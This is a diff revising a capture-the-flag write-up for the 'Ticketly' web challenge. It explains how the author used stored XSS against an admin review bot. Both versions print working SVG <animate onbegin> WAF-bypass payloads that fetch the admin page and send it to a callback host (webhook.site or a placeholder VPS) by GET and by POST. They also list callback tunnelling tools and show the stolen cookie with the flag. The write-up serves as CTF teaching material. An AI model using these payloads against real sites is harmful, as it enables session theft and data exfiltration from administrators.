@@ -1,115 +1,172 @@
+# Ticketly
 
-# Ticketly — BDSEC CTF Writeup
+## Challenge info
 
-**category:** web **author:** badhacker0x1
+- **Name:** Ticketly
+- **Category:** Web
+- **Author:** badhacker0x1
 
-## tl;dr
+The challenge provides a ticketing application where users can create accounts, submit support tickets, and send them for administrator review.
 
-ticket system where you make an account, open a ticket, and some admin bot comes through later and reviews it. classic setup for stored/blind XSS — you inject something nasty into the ticket, admin opens it with their authenticated session, and now your payload is running in admin-land instead of yours.
+That setup strongly suggests stored or blind XSS. The goal is to place a payload inside a ticket, wait for the administrator bot to open it, and execute JavaScript inside the administrator's authenticated session.
 
-## recon
+## First look
 
-two boxes given:
+Two challenge instances were provided:
 
-- alt server: `http://149.102.136.203:3000/`
-- main server: `http://45.33.28.244:3000/`
+```text
+Alternative server: http://149.102.136.203:3000/
+Main server:        http://45.33.28.244:3000/
+```
 
-nothing fancy here, just poke around the app first. make an account, create a ticket, see what fields get rendered back and whether html/js survives into the page. the whole vibe of "admin will review this" is basically screaming _self-XSS-turned-into-admin-XSS_.
+I started by creating an account and exploring the normal ticket workflow.
 
-## step 1 — confirm you can even pop JS
+The application allowed users to:
 
-start small, don't nuke it with an `alert()` that might get flagged/logged weird. just prove execution quietly:
+- register and log in
+- create support tickets
+- view submitted tickets
+- request administrator review
+
+Since an administrator bot eventually opens submitted tickets, any stored HTML injection inside the ticket content could potentially execute with administrator privileges.
+
+## Testing for XSS
+
+The application had a WAF that blocked most common XSS payloads.
+
+Straightforward payloads using elements such as `<script>` or common event handlers were rejected or filtered, so this was not a case where arbitrary HTML and JavaScript worked immediately.
+
+I tested different HTML elements and event-based execution methods until I found that an SVG animation payload could pass the filter:
 
 ```html
-<img src=x onerror="document.body.dataset.xss='confirmed'">
+<svg>
+  <animate
+    attributeName="x"
+    dur="1s"
+    onbegin="(new Image).src='http://YOUR-CALLBACK/ping?t='+Date.now()">
+  </animate>
+</svg>
 ```
 
-open your own ticket, pop devtools, check if `data-xss="confirmed"` shows up on `<body>`. if yes — cool, html isn't being escaped and your onerror handler is firing.
+The important part was the `onbegin` handler inside the SVG `<animate>` element.
 
-if it gets encoded/stripped, try markdown-flavored stuff instead in case the ticket body renders through a markdown parser rather than raw html.
+This bypassed the WAF and provided a way to run JavaScript when the ticket was rendered.
 
-## step 2 — set up a way to actually _see_ the callback
+## Confirming administrator-side execution
 
-you need something outside the app to ping so you know when/if the admin bot loads your payload. went through a few options here:
+Because the payload runs inside a ticket reviewed by a bot, there is no visible browser alert or direct output.
 
-- **webhook.site** — dead simple, gives you a unique url instantly, requests show up live in browser. good first try.
-- **ngrok** — tunnels a local http server out to a public https url, lets you actually run your own receiver and log full request bodies (`ngrok http 8000`), inspectable at `127.0.0.1:4040`.
-- **cloudflare quick tunnel** (`cloudflared tunnel --url http://localhost:8000`) — no account needed, random `trycloudflare.com` domain, might be less likely to get blocked than a known payload-hosting domain.
-- **localhost.run / pinggy** — ssh-based no-install tunnels, fine backups.
-- **your own vps** — best option honestly if you've got one. serve straight off port 80/443, no third party domain that might be filtered or blocked for the admin bot's egress.
+A callback server is needed to confirm that the administrator opened the ticket and executed the payload.
 
-quick receiver script (python stdlib, no deps) logs full method/path/headers/body to a file so you can `grep` it later:
-
-```python
-from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
-# ...logs every GET/POST to ticketly-callbacks.log, sends 204 back
-```
-
-## step 3 — first payload attempt (teammate's version)
-
-teammate got this through whatever filter ticketly has:
+I first used a small callback that only requested a `/ping` endpoint:
 
 ```html
-<svg><animate onbegin="fetch(location.href).then(r=>r.text()).then(d=>fetch('https://webhook.site/XXXXXX?d='+encodeURIComponent(d)))" attributeName=x dur=1s>
+<svg>
+  <animate
+    attributeName="x"
+    dur="1s"
+    onbegin="(new Image).src='http://YOUR-CALLBACK/ping?t='+Date.now()">
+  </animate>
+</svg>
 ```
 
-payload survived sanitization but no callback ever landed. two possibilities:
+Testing with a small request is useful because it separates two different problems:
 
-1. admin bot never actually opened the ticket, or
-2. admin bot opened it fine but couldn't reach `webhook.site` (egress filtering, CSP, whatever) — or the page was too big to cram into a GET query string and it just silently failed.
+1. Whether the XSS payload executed.
+2. Whether the data-exfiltration method worked.
 
-**no callback ≠ no execution.** don't assume the XSS is dead just because nothing showed up.
+A missing callback does not always mean that JavaScript execution failed. The administrator bot may be unable to reach a specific callback domain, or the exfiltration request itself may be malformed or too large.
 
-## step 4 — fix the payload
+## Exfiltrating the administrator page
 
-two changes:
+After finding a working SVG payload, the next step was to retrieve content visible to the administrator.
 
-**a) test execution separately from exfil.** ping first with something tiny before trying to send the whole dom:
+My first attempt sent the page contents through a query parameter:
 
 ```html
-<svg><animate attributeName=x dur=1s onbegin="(new Image).src='https://YOUR-CALLBACK/ping?t='+Date.now()"></animate></svg>
+<svg>
+  <animate
+    attributeName="x"
+    dur="1s"
+    onbegin="fetch(location.href)
+      .then(r => r.text())
+      .then(d => fetch(
+        'https://webhook.site/XXXXXX?d=' + encodeURIComponent(d)
+      ))">
+  </animate>
+</svg>
 ```
 
-if `/ping` shows up after submitting for review — great, you've got confirmed admin-side execution. now you know the _filter bypass_ works and can focus on the _exfil channel_ instead.
+The payload passed the WAF, but no useful callback arrived.
 
-**b) send the page via POST body, not a URL param.** GET query strings have length limits and the whole admin page HTML will blow way past that:
+There were several possible reasons:
+
+- the bot could not reach `webhook.site`
+- outbound requests to common callback services were filtered
+- the captured page was too large for a URL query string
+- the request failed before the data was transmitted
+
+To avoid URL-length limitations, I changed the payload to send the page through a POST body:
 
 ```html
-<svg><animate attributeName=x dur=1s onbegin="fetch(location.href).then(r=>r.text()).then(d=>fetch('https://YOUR-CALLBACK/capture',{method:'POST',mode:'no-cors',body:d}))"></animate></svg>
+<svg>
+  <animate
+    attributeName="x"
+    dur="1s"
+    onbegin="fetch(location.href)
+      .then(r => r.text())
+      .then(d => fetch('http://YOUR-CALLBACK/capture', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: d
+      }))">
+  </animate>
+</svg>
 ```
 
-switched the callback domain from webhook.site to a personal VPS receiver on port 80 (plain http, since ticketly itself is http, so no mixed-content weirdness) to rule out third-party domain blocking as the culprit.
+I also replaced the third-party callback service with a receiver hosted on my own VPS.
 
-## step 5 — dig through the loot
+The VPS listened directly on port 80. Since the Ticketly application was also served over HTTP, this avoided mixed-content issues and reduced the chance that the bot would block the destination based on its domain.
 
-once stuff starts landing in the log file, don't eyeball it — grep for the exact flag format only:
+## Receiving the callback
 
-```bash
-grep -oE 'BDSEC\{[^}]+\}' ticketly-callbacks.log
+After submitting the ticket for review, the administrator bot opened it and executed the SVG payload.
+
+The callback contained data from:
+
+```text
+http://127.0.0.1:3000/admin/ticket/64
 ```
 
-important: don't submit anything that just _looks_ flag-shaped. false flags are apparently a thing here, so only the real `BDSEC{...}` pattern counts, and with only 10 submission attempts allowed, guessing is not the move.
+This showed that the administrator bot accessed the application locally from the challenge server.
 
-## other filter-bypass options if `<svg><animate>` gets nerfed
+The captured administrator data included the cookie:
 
-```html
-<details open ontoggle="fetch('https://YOUR-CALLBACK/details',{mode:'no-cors'})">
-<iframe srcdoc="<img src=x onerror=fetch('https://YOUR-CALLBACK/frame',{mode:'no-cors'})>"></iframe>
-```
-
-## status — solved ✅
-
-self-hosted vps receiver was the move. once the exfil switched off webhook.site/tunnel domains and onto a plain port-80 listener on the vps, the admin bot's callback landed clean.
-
-captured payload showed the admin session's cookie jar straight from `/admin/ticket/64`, origin `http://127.0.0.1:3000` — confirming the admin bot runs locally on the box and the XSS reached it fine once the exfil channel wasn't the bottleneck. cookie value contained the flag directly:
-
-```
+```text
 flag=bdsec{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
 ```
 
-so the earlier no-callback issue really was the third-party domain getting blocked/filtered for the bot's egress — not a dead XSS. lesson stands: **no callback ≠ no execution**, always rule out the exfil channel before assuming the payload didn't fire.
+So the exploit chain was:
 
-flag: `BDSEC{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}`
+1. Submit a ticket containing the SVG payload.
+2. Bypass the WAF using the `<svg><animate>` event handler.
+3. Wait for the administrator bot to review the ticket.
+4. Execute JavaScript in the administrator's session.
+5. Send the administrator data to the VPS receiver.
+6. Extract the flag from the captured cookie.
 
-_(no automated payload spraying or brute forcing — that's against event rules anyway)_
+## Flag
 
+```text
+BDSEC{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
+```
+
+## Final thoughts
+
+This was a nice stored XSS challenge with two separate obstacles.
+
+The first was finding a payload that could get past the application's WAF. Most common XSS attempts were blocked, but an SVG animation with an `onbegin` handler was accepted and executed.
+
+The second problem was getting data back from the administrator bot. The initial third-party callback service did not receive anything useful, but switching to a self-hosted VPS listener and sending the captured content through a POST body worked reliably.
+
+The main lesson is that payload execution and data exfiltration should be tested separately. A missing callback does not automatically mean the XSS failed. The payload may already be running correctly while the outbound request is being blocked.
